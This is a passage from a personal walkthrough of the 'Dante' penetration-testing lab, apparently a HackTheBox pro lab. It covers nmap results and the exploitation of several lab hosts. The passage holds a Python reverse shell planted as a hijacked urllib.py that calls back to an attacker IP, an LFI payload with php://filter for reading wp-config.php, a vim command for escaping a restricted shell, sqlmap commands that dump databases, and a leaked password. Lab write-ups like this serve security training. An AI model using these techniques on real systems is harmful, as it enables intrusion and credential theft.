|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.1.101
Host is up (0.29s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE        VERSION
21/tcp   open     ftp?
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| fingerprint-strings: 
|   DNSVersionBindReqTCP, RPCCheck: 
|     220-FileZilla Server 0.9.60 beta
|     DANTE-FTP
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|   GenericLines, NULL: 
|     220-FileZilla Server 0.9.60 beta
|     DANTE-FTP
|   GetRequest, HTTPOptions: 
|     220-FileZilla Server 0.9.60 beta
|     DANTE-FTP
|     Syntax error, command unrecognized.
|   Help: 
|     214-The following commands are recognized:
|     ABOR ADAT ALLO APPE AUTH CDUP CLNT CWD 
|     DELE EPRT EPSV FEAT HASH HELP LIST MDTM
|     MFMT MKD MLSD MLST MODE NLST NOOP NOP 
|     OPTS PASS PASV PBSZ PORT PROT PWD QUIT
|     REST RETR RMD RNFR RNTO SITE SIZE STOR
|     STRU SYST TYPE USER XCUP XCWD XMKD XPWD
|     XRMD
|     Have a nice day.
|   RTSPRequest: 
|_    500 Syntax error, command unrecognized.
135/tcp  open     msrpc          Microsoft Windows RPC
139/tcp  open     netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds?
2020/tcp filtered xinupageserver
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=3/15%Time=67D50340%P=x86_64-pc-linux-gnu%r(N
SF:ULL,31,"220-FileZilla\x20Server\x200\.9\.60\x20beta\r\n220\x20DANTE-FTP
SF:\r\n")%r(GenericLines,31,"220-FileZilla\x20Server\x200\.9\.60\x20beta\r
SF:\n220\x20DANTE-FTP\r\n")%r(Help,1A7,"214-The\x20following\x20commands\x
SF:20are\x20recognized:\r\n\x20\x20\x20ABOR\x20\x20\x20ADAT\x20\x20\x20ALL
SF:O\x20\x20\x20APPE\x20\x20\x20AUTH\x20\x20\x20CDUP\x20\x20\x20CLNT\x20\x
SF:20\x20CWD\x20\r\n\x20\x20\x20DELE\x20\x20\x20EPRT\x20\x20\x20EPSV\x20\x
SF:20\x20FEAT\x20\x20\x20HASH\x20\x20\x20HELP\x20\x20\x20LIST\x20\x20\x20M
SF:DTM\r\n\x20\x20\x20MFMT\x20\x20\x20MKD\x20\x20\x20\x20MLSD\x20\x20\x20M
SF:LST\x20\x20\x20MODE\x20\x20\x20NLST\x20\x20\x20NOOP\x20\x20\x20NOP\x20\
SF:r\n\x20\x20\x20OPTS\x20\x20\x20PASS\x20\x20\x20PASV\x20\x20\x20PBSZ\x20
SF:\x20\x20PORT\x20\x20\x20PROT\x20\x20\x20PWD\x20\x20\x20\x20QUIT\r\n\x20
SF:\x20\x20REST\x20\x20\x20RETR\x20\x20\x20RMD\x20\x20\x20\x20RNFR\x20\x20
SF:\x20RNTO\x20\x20\x20SITE\x20\x20\x20SIZE\x20\x20\x20STOR\r\n\x20\x20\x2
SF:0STRU\x20\x20\x20SYST\x20\x20\x20TYPE\x20\x20\x20USER\x20\x20\x20XCUP\x
SF:20\x20\x20XCWD\x20\x20\x20XMKD\x20\x20\x20XPWD\r\n\x20\x20\x20XRMD\r\n2
SF:14\x20Have\x20a\x20nice\x20day\.\r\n")%r(GetRequest,5A,"220-FileZilla\x
SF:20Server\x200\.9\.60\x20beta\r\n220\x20DANTE-FTP\r\n500\x20Syntax\x20er
SF:ror,\x20command\x20unrecognized\.\r\n")%r(HTTPOptions,5A,"220-FileZilla
SF:\x20Server\x200\.9\.60\x20beta\r\n220\x20DANTE-FTP\r\n500\x20Syntax\x20
SF:error,\x20command\x20unrecognized\.\r\n")%r(RTSPRequest,29,"500\x20Synt
SF:ax\x20error,\x20command\x20unrecognized\.\r\n")%r(RPCCheck,FE,"220-File
SF:Zilla\x20Server\x200\.9\.60\x20beta\r\n220\x20DANTE-FTP\r\n500\x20Synta
SF:x\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20
SF:command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\x20unre
SF:cognized\.\r\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n5
SF:00\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n")%r(DNSVersionB
SF:indReqTCP,FE,"220-FileZilla\x20Server\x200\.9\.60\x20beta\r\n220\x20DAN
SF:TE-FTP\r\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x
SF:20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20err
SF:or,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\
SF:x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\x20unrecognized
SF:\.\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-WS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:e4:72 (VMware)
| smb2-time: 
|   date: 2025-03-15T04:37:28
|_  start_date: N/A

Nmap scan report for 172.16.1.102
Host is up (0.29s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
|_http-title: Dante Marriage Registration System :: Home Page
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
|_ssl-date: TLS randomness does not represent time
|_http-title: Dante Marriage Registration System :: Home Page
| ssl-cert: Subject: commonName=localhost/organizationName=TESTING CERTIFICATE
| Subject Alternative Name: DNS:localhost
| Not valid before: 2022-06-24T01:07:25
|_Not valid after:  2022-12-24T01:07:25
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-03-15T04:37:50+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DANTE-WS03
| Not valid before: 2025-03-14T03:31:05
|_Not valid after:  2025-09-13T03:31:05
| rdp-ntlm-info: 
|   Target_Name: DANTE-WS03
|   NetBIOS_Domain_Name: DANTE-WS03
|   NetBIOS_Computer_Name: DANTE-WS03
|   DNS_Domain_Name: DANTE-WS03
|   DNS_Computer_Name: DANTE-WS03
|   Product_Version: 10.0.19041
|_  System_Time: 2025-03-15T04:37:12+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-15T04:37:30
|_  start_date: N/A
|_nbstat: NetBIOS name: DANTE-WS03, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:b2:0a (VMware)

Post-scan script results:
| clock-skew: 
|   0s: 
|     172.16.1.5
|     172.16.1.17
|     172.16.1.10
|     172.16.1.102
|     172.16.1.101
|     172.16.1.13
|_    172.16.1.20
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (11 hosts up) scanned in 877.76 seconds
```

Okay, so now we can perform our attacks on any of these networks without worrying about pivoting again, there are a lot of stuff here but let's do it one by one

### 172.16.1.1 (DANTE-FW01)

```
Nmap scan report for 172.16.1.1
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx
|_http-title: Did not follow redirect to https://172.16.1.1/
443/tcp open  ssl/http nginx
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=pfSense-5efcc658e3fe9/organizationName=pfSense webConfigurator Self-Signed Certificate
| Subject Alternative Name: DNS:pfSense-5efcc658e3fe9
| Not valid before: 2020-07-01T17:22:33
|_Not valid after:  2025-12-22T17:22:33
| tls-alpn: 
|   h2
|_  http/1.1
| tls-nextprotoneg: 
|   h2
|_  http/1.1
```

This subnet has PfSense firewall running on it so we can ignore this

### 172.16.1.5 (DANTE-SQL01) - Part1

```
Nmap scan report for 172.16.1.5
Host is up (0.29s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp?
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp             44 Jan 08  2021 flag.txt
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     220 Dante Staff Drop Box
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|   DNSVersionBindReqTCP: 
|     220 Dante Staff Drop Box
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|   GenericLines, NULL: 
|     220 Dante Staff Drop Box
|   GetRequest, HTTPOptions, RTSPRequest: 
|     500 Syntax error, command unrecognized.
|   Help: 
|     214-The following commands are recognized:
|     ABOR ADAT ALLO APPE AUTH CDUP CLNT CWD 
|     DELE EPRT EPSV FEAT HASH HELP LIST MDTM
|     MFMT MKD MLSD MLST MODE NLST NOOP NOP 
|     OPTS PASS PASV PBSZ PORT PROT PWD QUIT
|     REST RETR RMD RNFR RNTO SITE SIZE STOR
|     STRU SYST TYPE USER XCUP XCWD XMKD XPWD
|     XRMD
|     Have a nice day.
|   RPCCheck: 
|     500 Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|     Syntax error, command unrecognized.
|_    Syntax error, command unrecognized.
111/tcp  open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-15T03:33:32
|_Not valid after:  2055-03-15T03:33:32
| ms-sql-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
| ms-sql-ntlm-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
|_ssl-date: 2025-03-15T04:37:52+00:00; 0s from scanner time.
2049/tcp open  nlockmgr     1-4 (RPC #100021)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=3/15%Time=67D50331%P=x86_64-pc-linux-gnu%r(N
SF:ULL,1A,"220\x20Dante\x20Staff\x20Drop\x20Box\r\n")%r(GenericLines,1A,"2
SF:20\x20Dante\x20Staff\x20Drop\x20Box\r\n")%r(Help,1A7,"214-The\x20follow
SF:ing\x20commands\x20are\x20recognized:\r\n\x20\x20\x20ABOR\x20\x20\x20AD
SF:AT\x20\x20\x20ALLO\x20\x20\x20APPE\x20\x20\x20AUTH\x20\x20\x20CDUP\x20\
SF:x20\x20CLNT\x20\x20\x20CWD\x20\r\n\x20\x20\x20DELE\x20\x20\x20EPRT\x20\
SF:x20\x20EPSV\x20\x20\x20FEAT\x20\x20\x20HASH\x20\x20\x20HELP\x20\x20\x20
SF:LIST\x20\x20\x20MDTM\r\n\x20\x20\x20MFMT\x20\x20\x20MKD\x20\x20\x20\x20
SF:MLSD\x20\x20\x20MLST\x20\x20\x20MODE\x20\x20\x20NLST\x20\x20\x20NOOP\x2
SF:0\x20\x20NOP\x20\r\n\x20\x20\x20OPTS\x20\x20\x20PASS\x20\x20\x20PASV\x2
SF:0\x20\x20PBSZ\x20\x20\x20PORT\x20\x20\x20PROT\x20\x20\x20PWD\x20\x20\x2
SF:0\x20QUIT\r\n\x20\x20\x20REST\x20\x20\x20RETR\x20\x20\x20RMD\x20\x20\x2
SF:0\x20RNFR\x20\x20\x20RNTO\x20\x20\x20SITE\x20\x20\x20SIZE\x20\x20\x20ST
SF:OR\r\n\x20\x20\x20STRU\x20\x20\x20SYST\x20\x20\x20TYPE\x20\x20\x20USER\
SF:x20\x20\x20XCUP\x20\x20\x20XCWD\x20\x20\x20XMKD\x20\x20\x20XPWD\r\n\x20
SF:\x20\x20XRMD\r\n214\x20Have\x20a\x20nice\x20day\.\r\n")%r(GetRequest,29
SF:,"500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n")%r(HTTPOpti
SF:ons,29,"500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n")%r(RT
SF:SPRequest,29,"500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n"
SF:)%r(RPCCheck,CD,"500\x20Syntax\x20error,\x20command\x20unrecognized\.\r
SF:\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax
SF:\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20c
SF:ommand\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\x20unrec
SF:ognized\.\r\n")%r(DNSVersionBindReqTCP,E7,"220\x20Dante\x20Staff\x20Dro
SF:p\x20Box\r\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500
SF:\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20e
SF:rror,\x20command\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20comman
SF:d\x20unrecognized\.\r\n500\x20Syntax\x20error,\x20command\x20unrecogniz
SF:ed\.\r\n")%r(DNSStatusRequestTCP,6C,"220\x20Dante\x20Staff\x20Drop\x20B
SF:ox\r\n500\x20Syntax\x20error,\x20command\x20unrecognized\.\r\n500\x20Sy
SF:ntax\x20error,\x20command\x20unrecognized\.\r\n");
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-15T04:37:16
|_  start_date: 2025-03-15T03:33:27
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: DANTE-SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:f1:fa (VMware)
```

This subnet looks like it has Windows Server running on it. It also has the FTP port open with Anonymous login allowed, SMB and MSSQL

<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

Download the flag and we got em

4th flag: `DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}`

***

## <mark style="color:red;">Seclusion is an illusion</mark>

There is also SMB port available, we enumerate it using `smbclient`

<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

We are denied access, I continued to check out the `MSSQL` service and used the SQL credentials to authenticate but that didn't work. I crashed out for a while...

Then, I just decided to check out other subnets instead of staying here

### 172.16.1.10 (DANTE-NIX02)

```
Nmap scan report for 172.16.1.10
Host is up (0.29s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5a:9c:1b:a5:c1:7f:2d:4f:4b:e8:cc:7b:e4:47:bc:a9 (RSA)
|   256 fd:d6:3a:3f:a8:04:56:4c:e2:76:db:85:91:0c:5e:42 (ECDSA)
|_  256 e2:d5:17:7c:58:75:26:5b:e1:1b:98:39:3b:2c:6c:fc (ED25519)
80/tcp    open     http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Dante Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp   open     netbios-ssn Samba smbd 4.6.2
445/tcp   open     netbios-ssn Samba smbd 4.6.2
1169/tcp  filtered tripwire
14441/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-03-15T04:37:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-NIX02, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

Looks like HTTP and SMB port is open. Let's start with SMB enumeration

```
smbclient -L \\\\172.16.1.10\\
```

<figure><img src="../../../.gitbook/assets/image (125) (1).png" alt=""><figcaption></figcaption></figure>

Looks like we have some interesting stuff here. Enumerate the `print$` and `SlackMigration` shares.

```
smbclient //172.16.1.10/SlackMigration -c 'recurse;ls'
```

<figure><img src="../../../.gitbook/assets/image (126) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (127) (1).png" alt=""><figcaption></figcaption></figure>

There is a file present. Connect to the share and download it

```
smbclient //172.16.1.10/SlackMigration
smb: \> get admintasks.txt
```

Check the txt file out

<figure><img src="../../../.gitbook/assets/image (129) (1).png" alt=""><figcaption></figcaption></figure>

There a few hints here. But what is interesting its mentioning the user `margaret` . This could be useful later. Let's check out the HTTP port.

<figure><img src="../../../.gitbook/assets/image (130) (1).png" alt=""><figcaption></figcaption></figure>

When checking out the website. I noticed something familiar with the URL. It has potential to be vulnerable to LFI&#x20;

`/nav.php?page=about.html`

So, i tested with a basic `/etc/passwd` and whaddayaknow.

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

From the results, we see user `frank` , `nxautomation` and `margaret` present. Let's try to read either the flags in their home directory.

The file doesn't exist in anyone except in `margaret`'s home directory

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

5th flag: `DANTE{LF1_M@K3s_u5_lol}`

***

## <mark style="color:red;">Snake it 'til you make it</mark>

Looking back the `admintasks.txt` . We know the website deployed Wordpress and the removal is still pending. This is proven by using Wappalyzer to look at available CMS but Wordpress is not there. We can try to attempt to grab the database password.

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption><p>Hacktricks reference</p></figcaption></figure>

Now we just need the path to the file. Based on this post on reddit:

<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

The path seems to be `/var/www/html/wordpress/wp-config.php`

So from here, to inspect the php file we use a PHP Base64 wrapper to encode the path

```
php://filter/convert.base64-encode/resource=../../../../../../../../../../../var/www/html/wordpress/wp-config.php
```

<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

Decode it

<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

Nice, now we can try to SSH into user `margaret`

```
ssh margaret@172.16.1.10
```

Success! but it looks like we are in a restricted shell with only a few allowed commands

<figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

`Vim` is favourable in this situation. We can use it to escape the restricted shell

{% embed url="https://0xffsec.com/handbook/shells/restricted-shells/" %}

```
:set shell=/bin/bash
:shell
```

<figure><img src="../../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

Enter and boom we have an interactive shell

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Like usual, for privesc upload linpeas and let's see what we can find

<figure><img src="../../../.gitbook/assets/image (116) (1).png" alt=""><figcaption></figcaption></figure>

There are no other interesting stuff in `margaret`'s but there some worth checking out in `frank`'s. Looks like it has something to do with Slack.&#x20;

<figure><img src="../../../.gitbook/assets/image (117) (1).png" alt=""><figcaption></figcaption></figure>

Even though we could not traverse the directories, we could download the zipped file of the export onto our machine and change directories directly.

Looking at around, there is a leaked conversation between `frank` and `margaret` in:

`/secure/2020-05-18.json`

<figure><img src="../../../.gitbook/assets/image (118) (1).png" alt=""><figcaption></figcaption></figure>

We can see the password of `frank` being leaked here. Let's try switching to frank.

<figure><img src="../../../.gitbook/assets/image (119) (1).png" alt=""><figcaption></figcaption></figure>

It didn't work and I was frustrated. I kept looking for a way and then I found this article

<figure><img src="../../../.gitbook/assets/image (120) (1).png" alt=""><figcaption></figcaption></figure>

Since, we dont' have access on frank, we can access it on margaret's home directory.

<figure><img src="../../../.gitbook/assets/image (122) (1).png" alt=""><figcaption></figcaption></figure>

I looked through everything and found nothing and decided to look at the `/exported_data` folder and hoped to find something different and well...

<figure><img src="../../../.gitbook/assets/image (123) (1).png" alt=""><figcaption></figcaption></figure>

I don't know why this happened honestly, was it intentional? maybe...but it is very annoying :)

`frank:TractorHeadtorchDeskmat`

<figure><img src="../../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

We see a python file in `frank`'s system. The script looks like its checking to see if the local Apache web server returns a status 200 by sending a request to the localhost. Simply put, its a script to make sure the Apache web server is always running. The thing is it doesn't have a `while` loop to repeat the process. From this, we can deduce that a cronjob was configured to make sure it runs at regular intervals.

Of course, I already checked the output of linpeas, but did not notice anything peculiar. This is when to utilise the tool `pspy`. &#x20;

<figure><img src="../../../.gitbook/assets/image (719).png" alt=""><figcaption></figcaption></figure>

With this we can check the running cronjobs with more detail than linpeas. Upload the binary file on to the target and run it

<figure><img src="../../../.gitbook/assets/image (720).png" alt=""><figcaption></figcaption></figure>

Now, we wait for a while to monitor any process that uses the apache script.

<figure><img src="../../../.gitbook/assets/image (751).png" alt=""><figcaption></figcaption></figure>

And there it is. We can see it is using the `urllib.py` library to load modules. Maybe we could use this to escalate to root.

I googled a bit and saw this:

<figure><img src="../../../.gitbook/assets/image (722).png" alt=""><figcaption></figcaption></figure>

So the exploit we have to be doing is Library Hijacking. Yay! (This is my first time). Dive deeper to find a suitable exploit/method.

{% embed url="https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7" %}

So from what I have read so far, if we create a file that has the name of the library, supposedly Python will load that library first from the directory that has the script of the cronjob.&#x20;

What we can do from here is put a reverse shell inside the fake library script so that everytime the cronjob excutes, our reverse shell will be loaded

This will be my reverse shell script:

```python
import os
import subprocess
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1234))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p = subprocess.call(["/bin/bash", "-i"])
```

Name it urllib.py because that is the library I am targeting. Start a listener and wait until the cronjob executes.

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

And voila! we have root after so long...Get the flag

6th flag: `DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}`

***

## <mark style="color:red;">Again and again</mark>

### 172.16.1.12 (DANTE-NIX04)

```
Nmap scan report for 172.16.1.12
Host is up (0.29s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        ProFTPD
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 22:cc:a3:e8:7d:d5:65:6d:9d:ea:17:d1:d9:1b:32:cb (RSA)
|   256 04:fb:b6:1a:db:95:46:b7:22:13:61:24:76:80:1e:b8 (ECDSA)
|_  256 ae:c4:55:67:6e:be:ba:65:54:a3:c3:fc:08:29:24:0e (ED25519)
80/tcp   open  http       Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.12/dashboard/
443/tcp  open  ssl/http   Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.12/dashboard/
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
3306/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see here that FTP is open but does not allow Anonymous logins. HTTP and HTTPS of XAMPP service is running on PHP 7.4.7 and port `3306` is MySQL but is appearing as tcpwrapped. It could be because of firewall and its being filtered.

I tried to look for known exploits of PHP 7.4.7 but known were available. So, i fuzzed the web service

```
feroxbuster -u http://172.16.1.12 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

<figure><img src="../../../.gitbook/assets/image (110) (1).png" alt=""><figcaption></figcaption></figure>

Two notable directories were `/blog` and `/blog/database`. Lets check them out

<figure><img src="../../../.gitbook/assets/image (108) (1).png" alt=""><figcaption></figcaption></figure>

We are met with a responsive blog template according to the title here

<figure><img src="../../../.gitbook/assets/image (111) (1).png" alt=""><figcaption></figcaption></figure>

I was looking around and found this

<figure><img src="../../../.gitbook/assets/image (114) (1).png" alt=""><figcaption></figcaption></figure>

Notice the URL:

```
http://172.16.1.12/blog/single.php?id=5
```

I thought this was an easy IDOR but I was wrong xD. Also tested it multiple times but nothing came out. Also, Wappalyzer does not show this is built on a CMS. Let's continue to check the subdirectory

<figure><img src="../../../.gitbook/assets/image (112) (1).png" alt=""><figcaption></figcaption></figure>

Okay, standard XAMPP database directory. Now, let's try to look for some exploits. I found one that proved useful from Exploitdb

<figure><img src="../../../.gitbook/assets/image (113) (1).png" alt=""><figcaption></figcaption></figure>

So basically the vulnerable file is `/category.php` which has the vulnerable code:

```php
$id=$_REQUEST['id'];
$query="SELECT * from blog_categories where id='".$id."'";
```

The `id` parameter is inserted directly into the SQL query without any sanitization causing an SQLi vulnerability. We can test this by entering a single quote in the parameter:

```
http://172.16.1.12/blog/category.php?id=5'
```

<figure><img src="../../../.gitbook/assets/image (115) (1).png" alt=""><figcaption></figcaption></figure>

And there it is, returning an SQL error. From here, we can use `sqlmap` to enumerate available databases

```
sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch
```

<figure><img src="../../../.gitbook/assets/image (96) (1).png" alt=""><figcaption></figcaption></figure>

Alright, that worked. We have a database named `flag.` Check the tables

```
sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch -D flag --tables
```

<figure><img src="../../../.gitbook/assets/image (97) (1).png" alt=""><figcaption></figcaption></figure>

Dump the `flag` tables

```
sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch -D flag -T flag --dump
```

<figure><img src="../../../.gitbook/assets/image (99) (1).png" alt=""><figcaption></figcaption></figure>

7th flag: `DANTE{wHy_y0U_n0_s3cURe?!?!}`

***

## <mark style="color:red;">Five doctors</mark>

Looking again, there was a `blog_admin_db` database. After enumerating tables and dumping it, we will get some interesting information

<figure><img src="../../../.gitbook/assets/image (100) (1).png" alt=""><figcaption></figcaption></figure>

Enumerating the tables will show us a few tables. But the want we are interested in is `membership_users` .

```
sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch -D blog_admin_db -T membership_users --dump
```

<figure><img src="../../../.gitbook/assets/image (101) (1).png" alt=""><figcaption></figcaption></figure>

Now dump it

```
sqlmap 'http://172.16.1.12/blog/category.php?id=5' --dbs --batch -D blog_admin_db -T membership_users --dump
```

<figure><img src="../../../.gitbook/assets/image (102) (1).png" alt=""><figcaption></figcaption></figure>

Okay we see 2 users here with their MD5 hashed password. We can crack this using Crackstation. Crack both of their passwords and try to SSH

